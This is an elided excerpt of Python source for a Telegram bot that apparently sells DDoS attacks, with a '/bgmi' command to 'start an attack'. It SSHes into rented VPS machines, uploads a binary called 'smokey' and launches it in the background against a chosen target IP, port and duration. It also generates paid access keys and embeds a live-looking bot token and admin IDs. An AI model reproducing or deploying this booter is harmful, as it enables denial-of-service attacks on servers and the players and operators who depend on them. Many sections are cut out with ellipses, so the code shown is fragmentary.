...
ADMIN_IDS = [1332360551]  # Replace with actual admin IDs
BOT_TOKEN = "7413750316:AAFlwispwJhCoRlycCVkJGMmX7wpEZahevs"  # Replace with your bot token
...
def execute_distributed_attack(vps_list, target_ip, target_port, duration, progress_callback=None):
    ...
    for index, (ip, details) in enumerate(vps_list, start=1):
        try:
            ...
            check_cmd = "test -f /home/master/smokey && echo 'exists' || echo 'missing'"
            ...
            ssh_execute(ip, details['username'], details['password'], "chmod +x /home/master/smokey")
            
            # Execute attack using configured thread count
            attack_cmd = f"nohup /home/master/smokey {target_ip} {target_port} {duration} {THREADS_PER_VPS} >/dev/null 2>&1 &"
...
def process_vip_key_generation(message):
    ...
    try:
        ...
        # Generate numbered key (MAHAKALXGAMEXXXX format)
        key_number = str(key_counter).zfill(4)
        key = f"MAHAKALXGAME{key_number}"
        key_counter += 1
...
def welcome_start(message):
    ...
    welcome_text = (
        ...
        "[➖ CLICK HERE TO JOIN ➖](https://t.me/MAHAKALXGAME12)\n\n"
        "📌 *Try This Command:*\n"
        "`/bgmi` - 🚀 *Start an attack!*\n\n"
        "👑 *BOT CREATED BY:* [@MAHAKALXGAME](MAHAKALXGAME12)"
    )

    # Inline buttons
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/MAHAKALXGAME12"))
    keyboard.add(InlineKeyboardButton("👑 CREATOR", url="MAHAKALXGAME12"))
    ...
    bot.send_message(
        ...
        text=(
            "↘️                                                       ↙️\n\n"
            "*[➖ DM FOR REBRANDING ➖](MAHAKALXGAME12)*\n\n"
            "↗️                                                       ↖️"
        ),
        parse_mode="Markdown",
...
def process_stylish_broadcast(message):
    ...
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("📢 𝗝𝗢𝗜𝗡 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/MAHAKALXGAME12")
    )
    keyboard.add(
        InlineKeyboardButton("👑 𝗖𝗥𝗘𝗔𝗧𝗢𝗥", url="https://t.me/MAHAKALXGAME12")
    )
...
🆔 Admin ID: <code>6882674372, 1604629264</code>
   Username: @MAHAKALXGAME, @LostBoiXD 
"""
    bot.send_message(
        message.chat.id,
        caption,
...
def check_vps_status(message):
    ...
    for ip, details in vps_data['vps'].items():
        ...
        binary_status = ssh_execute(ip, details['username'], details['password'], "test -f /home/master/smokey && echo 1 || echo 0")[1].strip()
...
def process_binary_upload(message, ip):
    ...
    try:
        ...
        remote_path = f"/home/master/smokey"  # Directly to root as smokey
...
def process_vps_reset_confirmation(message):
    ...
    for ip, details in vps_data['vps'].items():
        try:
            ...
            ssh_execute(ip, details['username'], details['password'], "rm -f ~/home/master/smokey")
...
@bot.message_handler(func=lambda message: message.text.strip().upper().startswith("MAHAKALXGAME"))
...
def handle_attack_command(message):
    ...
    try:
        ...
        bot.send_message(
            ...
            f"📞 Contact support: @MAHAKALXGAME",
            parse_mode='Markdown'
        )
